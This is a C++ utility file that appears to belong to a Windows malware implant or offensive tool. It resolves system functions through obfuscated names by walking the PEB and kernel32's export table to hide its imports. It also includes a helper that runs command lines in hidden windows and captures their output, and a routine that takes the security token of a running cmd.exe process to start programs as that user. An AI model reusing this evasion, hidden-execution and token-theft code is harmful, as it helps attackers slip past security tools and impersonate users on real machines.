#include "utils.h"


const std::string domain_to_ip(const char* domain) {
    wsa_startup_type wsa_startup = WINAPI_OBFUSCATE(wsa_startup_type, "WSAStartup", "ws2_32");
    wsa_cleanup_type wsa_cleanup = WINAPI_OBFUSCATE(wsa_cleanup_type, "WSACleanup", "ws2_32");
    get_addr_info_type get_addr_info = WINAPI_OBFUSCATE(get_addr_info_type, "getaddrinfo", "ws2_32");
    inet_ntop_type inet_ntop_clone = WINAPI_OBFUSCATE(inet_ntop_type, "inet_ntop", "ws2_32");
    free_addr_info_type free_addr_info = WINAPI_OBFUSCATE(free_addr_info_type, "freeaddrinfo", "ws2_32");   
    
    struct addrinfo hints, * res;
    int status;
    char ipstr[INET_ADDRSTRLEN];

    // Initialize Winsock
    WSADATA wsadata;
    if (wsa_startup(MAKEWORD(2, 2), &wsadata) != 0) {
        return "";
    }

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET; // Use IPv4
    hints.ai_socktype = SOCK_STREAM;

    if ((status = get_addr_info(domain, NULL, &hints, &res)) != 0) {
        wsa_cleanup(); // Cleanup Winsock
        return "";
    }

    struct sockaddr_in* ipv4 = (struct sockaddr_in*)res->ai_addr;
    void* addr = &(ipv4->sin_addr);
    inet_ntop_clone(res->ai_family, addr, ipstr, sizeof ipstr);
    

    free_addr_info(res); // Free the linked list

    wsa_cleanup(); // Cleanup Winsock
    return ipstr;
}

std::string exec(const char* CommandLine, const HANDLE token) {
    create_process_a_type create_process_a = WINAPI_OBFUSCATE(create_process_a_type, "CreateProcessA", "kernel32");
    create_process_as_user_a_type create_process_as_user_a = WINAPI_OBFUSCATE(create_process_as_user_a_type, "CreateProcessAsUserA", "kernel32");
    create_pipe_type create_pipe = WINAPI_OBFUSCATE(create_pipe_type, "CreatePipe", "kernel32");
    close_handle_type close_handle = WINAPI_OBFUSCATE(close_handle_type, "CloseHandle", "kernel32");
    get_last_error_type get_last_error = WINAPI_OBFUSCATE(get_last_error_type, "GetLastError", "kernel32");
    read_file_type read_file = WINAPI_OBFUSCATE(read_file_type, "ReadFile", "kernel32");

    std::string result = "";
    SECURITY_ATTRIBUTES securityAttributes;
    HANDLE stdOutRead, stdOutWrite;
    ZeroMemory(&securityAttributes, sizeof(SECURITY_ATTRIBUTES));
    securityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
    securityAttributes.bInheritHandle = TRUE;
    securityAttributes.lpSecurityDescriptor = NULL;

    if (!create_pipe(&stdOutRead, &stdOutWrite, &securityAttributes, 0))
        throw get_last_error();

    try {
        STARTUPINFOA startupInfo;
        ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
        startupInfo.cb = sizeof(startupInfo);
        startupInfo.dwFlags |= STARTF_USESTDHANDLES;
        startupInfo.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
        startupInfo.hStdOutput = stdOutWrite;
        startupInfo.hStdError = stdOutWrite;
        startupInfo.dwFlags |= STARTF_USESHOWWINDOW;
        startupInfo.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi;
        ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
        if (token == nullptr) {
            if (!create_process_a(NULL, const_cast<char*>(CommandLine), NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &pi))
                throw get_last_error();
        } else {
            if (!create_process_as_user_a(token, NULL, const_cast<char*>(CommandLine), NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &pi)) {
                throw get_last_error();
            }
        }
        close_handle(pi.hProcess);
        close_handle(pi.hThread);
        close_handle(stdOutWrite);
        stdOutWrite = NULL;
        char buffer[4096];
        DWORD bytesRead;

        while (read_file(stdOutRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead != 0)
            result += std::string(buffer, buffer + bytesRead);
        DWORD le = get_last_error();
        if (le != ERROR_BROKEN_PIPE)
            throw le;
    }
    catch (...) {
        close_handle(stdOutRead);
        if (stdOutWrite != NULL)
            close_handle(stdOutWrite);
    }

    close_handle(stdOutRead);
    if (stdOutWrite != NULL)
        close_handle(stdOutWrite);
    // write_file(logs, "Finished successfully!");
    return result;
}
load_library_type load_library;
get_proc_address_type get_proc_address;

void initilize_winapi() {
    PPEB peb = (PPEB)__readgsqword(0x60); // Get PEB pointer
    char* module_base = nullptr;
    // Traverse through the loaded modules to find kernel32.dll
    for (PLIST_ENTRY pEntry = peb->Ldr->InMemoryOrderModuleList.Flink;
        pEntry != &peb->Ldr->InMemoryOrderModuleList;
        pEntry = pEntry->Flink) {

        PLDR_DATA_TABLE_ENTRY pModule = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        
        // Check if the module is kernel32.dll
        if (wcscmp(pModule->BaseDllName.Buffer, OBFUSCATE(L"KERNEL32.DLL")) == 0) {
            module_base = reinterpret_cast<char*>(pModule->DllBase);
            break;
        }
    }
    if (nullptr == module_base) {
        return;
    }

    IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(module_base);


    IMAGE_NT_HEADERS* ntHeader = reinterpret_cast<IMAGE_NT_HEADERS*>((uintptr_t)module_base + dosHeader->e_lfanew);

    // Get the export directory
    IMAGE_DATA_DIRECTORY exportDir = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    // Calculate the address of the export directory
    IMAGE_EXPORT_DIRECTORY* exportDirectory = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>((uintptr_t)module_base + exportDir.VirtualAddress);

    // Get the function names
    uint32_t* addressOfNames = reinterpret_cast<uint32_t*>((uintptr_t)module_base + exportDirectory->AddressOfNames);

    // Get the function addresses
    uint32_t* addressOfFunctions = reinterpret_cast<uint32_t*>((uintptr_t)module_base + exportDirectory->AddressOfFunctions);

    // Get the function name ordinals
    uint16_t* addressOfNameOrdinals = reinterpret_cast<uint16_t*>((uintptr_t)module_base + exportDirectory->AddressOfNameOrdinals);

    for (size_t i = 0; i < exportDirectory->NumberOfFunctions; ++i) {
        uint32_t functionNameRVA = addressOfNames[i];
        const char* functionName = reinterpret_cast<const char*>((uintptr_t)module_base + functionNameRVA);
        uint32_t functionAddressRVA = addressOfFunctions[addressOfNameOrdinals[i]];
        uintptr_t functionAddress = (uintptr_t)module_base + functionAddressRVA;
        if (strcmp(functionName, OBFUSCATE("GetProcAddress")) == 0) {
            get_proc_address = reinterpret_cast<get_proc_address_type>(functionAddress);
        } else if (strcmp(functionName, OBFUSCATE("LoadLibraryA")) == 0) {
            load_library = reinterpret_cast<load_library_type>(functionAddress);
        }
    }
}


FARPROC resolve_winapi(const char* dll_name, const char* func_name) {
    HMODULE module = load_library(dll_name);
    return get_proc_address(module, func_name);
}



HANDLE get_token_of_user_process()
{
    create_toolhelp_snapshot_type create_toolhelp_snapshot = WINAPI_OBFUSCATE(create_toolhelp_snapshot_type, "CreateToolhelp32Snapshot", "kernel32");
    process32_first_type process32_first = WINAPI_OBFUSCATE(process32_first_type, "Process32First", "kernel32");
    process32_next_type process32_next = WINAPI_OBFUSCATE(process32_next_type, "Process32Next", "kernel32");
    open_process_type open_process = WINAPI_OBFUSCATE(open_process_type, "OpenProcess", "kernel32");
    open_process_token_type open_process_token = WINAPI_OBFUSCATE(open_process_token_type, "OpenProcessToken", "kernel32");
    HANDLE hSnapshot = create_toolhelp_snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) {
        return INVALID_HANDLE_VALUE;
    }

    HANDLE hToken;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (process32_first(hSnapshot, &pe32)) {
        do {
            if (strcmp(reinterpret_cast<char*>(pe32.szExeFile), OBFUSCATE("cmd.exe")) != 0) {
                continue;
            }
            if (HANDLE hProcess = open_process(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID)) {
                if (open_process_token(hProcess, TOKEN_READ | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hToken)) {
                    return hToken;
                }
            }
        } while (process32_next(hSnapshot, &pe32));
    }
    return INVALID_HANDLE_VALUE;
}